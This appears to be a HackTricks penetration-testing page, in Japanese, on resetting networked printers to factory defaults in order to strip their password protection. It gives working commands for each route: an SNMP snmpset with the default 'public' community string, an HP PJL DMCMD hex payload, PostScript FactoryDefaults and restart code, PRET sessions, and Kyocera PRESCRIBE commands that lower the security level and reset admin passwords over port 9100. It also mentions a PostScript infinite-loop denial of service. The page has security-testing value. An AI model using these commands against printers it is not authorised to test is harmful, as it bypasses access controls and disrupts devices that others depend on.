<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) を使ってAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、ハッキングのコツを共有する。

</details>


デバイスを工場出荷時のデフォルトに**リセットする**ことは、ユーザー設定のパスワードのような保護メカニズムを**上書きする**ため、セキュリティ上重要な機能です。これは通常、プリンターの**コントロールパネル**上の**特別なキーの組み合わせ**を押すことで行うことができます。このようなコールドリセットは数秒で完了するため、例えば昼休みにコピー室に忍び込むなど、ローカルの攻撃者やペネトレーションテスターにとって現実的なシナリオです。ただし、デバイスへの**物理的アクセス**は**常にオプションではありません**。

### SNMP

Printer-MIBは**prtGeneralReset**オブジェクト（**OID 1.3.6.1.2.1.43.5.1.1.3.1**）を定義しており、攻撃者はSNMPを使用してデバイスを再起動（powerCycleReset(4)）、NVRAM設定をリセット（resetToNVRAM(5)）、または工場出荷時のデフォルトに復元（resetToFactoryDefaults(6)）することができます。この機能/攻撃は**多くのプリンターでサポートされており**、組み込みウェブサーバーのユーザー設定パスワードなどのすべての保護メカニズムを削除します。保護メカニズムを効率的にバイパスできる一方で、このアプローチの実用的な欠点は、**静的IPアドレスの設定が失われる**ことです。**DHCPサービスが利用できない場合**、攻撃者は工場出荷時のデフォルトにリセットした後、デバイスに**再接続することはできません**。

デバイスを工場出荷時のデフォルトに**リセットする**には、以下に示すように`snmpset`コマンドを使用します（**コミュニティストリング**を知っている必要があります。ほとんどの場合、デフォルトは`public`です）：
```bash
snmpset -v1 -c public printer 1.3.6.1.2.1.43.5.1.1.3.1 i 6
```
### [PML](./#pml)/[PJL](./#pjl)

多くのシナリオでは、攻撃者はファイアウォールや不明なSNMPコミュニティ文字列のためにSNMPリクエストを実行する能力がありません。しかし、**HPデバイス**では、**SNMP**をその**PML表現**に変換し、正当な印刷ジョブ内にリクエストを埋め込むことができます。これにより、攻撃者は以下に示すように、通常の印刷ジョブ内でデバイスを**再起動および/またはリセットして工場出荷時のデフォルトに戻す**ことができます：
```bash
@PJL DMCMD ASCIIHEX="040006020501010301040106"
```
誰でもこの攻撃をHPプリンターで再現できます。デバイスの再起動やリセットは、[**PRET**](https://github.com/RUB-NDS/PRET)を使用して簡単に再現できます：
```bash
./pret.py -q printer pjl
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PostScript

PostScriptには同様の機能があります：**FactoryDefaults** システムパラメーターは、「**trueに設定され**、**プリンターがオフになる直前**に、次の電源オン時にすべての不揮発性パラメーターが**工場出荷時のデフォルト値**に戻るフラグです」。**PostScript**自体にも環境を**再起動**する機能がありますが、**有効なパスワード**が必要です。\
しかし、PostScriptインタープリターは、[ドキュメント処理](http://hacking-printers.net/wiki/index.php/Document\_processing) DoS攻撃で議論されているように、**無限ループ**に陥ることができ、これによりユーザーはデバイスを**手動で再起動**し、PostScriptのパスワードをリセットする必要があります。

PostScriptシステムパラメーターを工場出荷時のデフォルトにリセットする：
```bash
<< /FactoryDefaults true >> setsystemparams
```
PostScript インタープリタと仮想メモリを再起動します：
```bash
true 0 startjob systemdict /quit get exec
```
誰でもプリンターのPostScriptインタープリタを再起動またはリセットすることが、[**PRET**](https://github.com/RUB-NDS/PRET)を使用して**簡単に再現できます**：
```bash
./pret.py -q printer ps
Connection to printer established

Welcome to the pret shell. Type help or ? to list commands.
printer:/> reset
printer:/> restart
```
### PRESCRIBE

**キョセラデバイス**において、**PRESCRIBEページ** 記述言語は以下に示すコマンドのいずれかを使用して、通常の印刷ジョブ内からデバイスを工場出荷時のデフォルトに**リセットする**ために使用することができます：
```bash
!R! KSUS "AUIO", "CUSTOM:Admin Password = 'admin00'";  CMMT "Drop the security level, reset password";
!R! ACNT "REST";                                       CMMT "Reset account code admin password";
!R! EGRE;                                              CMMT "Reset the engine board to factory defaults";
!R! SIOP0,"RESET:0";                                   CMMT "Reset configuration settings";
```
この攻撃を再現するには、プリンターの9100/tcpポートに対して生のネットワーク接続を開き、**上記のコマンドを送信します**。

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい場合**や**HackTricksをPDFでダウンロードしたい場合**は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>
